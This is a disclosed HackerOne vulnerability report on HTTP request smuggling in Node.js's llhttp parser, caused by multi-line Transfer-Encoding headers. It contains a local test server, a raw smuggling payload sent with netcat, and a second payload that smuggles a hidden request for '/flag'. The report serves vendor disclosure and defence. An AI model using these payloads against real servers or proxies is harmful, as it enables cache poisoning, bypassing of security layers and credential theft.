# HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding

## Report Details
- **Report ID**: 1501679
- **URL**: https://hackerone.com/reports/1501679
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-03-06T03:45:25.040Z
- **Disclosed**: 2022-07-07T17:26:25.203Z

## Reporter
- **Username**: zeyu2001
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** 
The `llhttp` parser in the `http` module in Node v17.6.0 does not correctly handle multi-line `Transfer-Encoding` headers. This can lead to HTTP Request Smuggling (HRS).

**Description:**
When  Node receives the following request:

```http
GET / HTTP/1.1
Transfer-Encoding: chunked
 , identity

1
a
0


```

it processes the final encoding as `chunked`. Relevant code [here](https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L483).

Since Node accepts multi-line header values (defined as `obs-fold` in [RFC7230](https://datatracker.ietf.org/doc/html/rfc7230), the `Transfer-Encoding` header is actually `chunked , identity`. An upstream proxy that correctly implements multi-line header values will therefore process the final encoding as `identity` instead. This could lead to request smuggling as an `identity` header indicates that the body length is 0 - the upstream proxy and Node will disagree on where a request ends.

The current behaviour is in violation of RFC7230 section 3.2.4, which states:

```
A server that receives an obs-fold in a request message that is not
within a message/http container MUST either reject the message by
sending a 400 (Bad Request), preferably with a representation
explaining that obsolete line folding is unacceptable, or replace
each received obs-fold with one or more SP octets prior to
interpreting the field value or forwarding the message downstream.
```

While Node correctly replaces each received `obs-fold` with SP octets, in the case of the `Transfer-Encoding` header it does not do so **prior to interpreting the field value**.

**Note:** This could be seen as an incomplete fix to #1002188, though it is a slightly different issue. The fix for #1002188 processed subsequent `Transfer-Encoding` headers, only setting the `chunked` encoding if the last `Transfer-Encoding` header is `chunked`. This should be extended to check for subsequent lines of the same `Transfer-Encoding` header.

## Steps To Reproduce:

**Testing Server**

Run the following server (`node server.js`):

```javascript
const http = require('http');

http.createServer((request, response) => {
   let body = [];
   request.on('error', (err) => {
   response.end("error while reading body: " + err)
   }).on('data', (chunk) => {
      body.push(chunk);
   }).on('end', () => {
   body = Buffer.concat(body).toString();
   
   response.on('error', (err) => {
      response.end("error while sending response: " + err)
   });

   response.end(JSON.stringify({
         "Headers": request.headers,
         "Length": body.length,
         "Body": body,
      }) + "\n");
   });
}).listen(80);
```

**Payload**

```bash
printf "GET / HTTP/1.1\r\n"\
"Transfer-Encoding: chunked\r\n"\
" , identity\r\n"\
"\r\n"\
"1\r\n"\
"a\r\n"\
"0\r\n"\
"\r\n" | nc localhost 80
```

**Output**

```http
HTTP/1.1 200 OK
Date: Sun, 06 Mar 2022 03:34:05 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 77

{"Headers":{"transfer-encoding":"chunked , identity"},"Length":1,"Body":"a"}
```

This shows the invalid parsing of the `Transfer-Encoding` header.

**Note:** In the case of #1002188, the following payload demonstrates the same scenario (except a duplicate `Transfer-Encoding` header is replaced with a multi-line one)

```http
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked
 , chunked-false

1
A
0

GET /flag HTTP/1.1
Host: 127.0.0.1
foo: x


```

## Supporting Material/References:

Payloads and outputs:
{F1644164}
{F1644165}

Server code:
{F1644163}

## Impact

Depending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.

## Attachments
- server.js
- ss1.png
- ss2.png
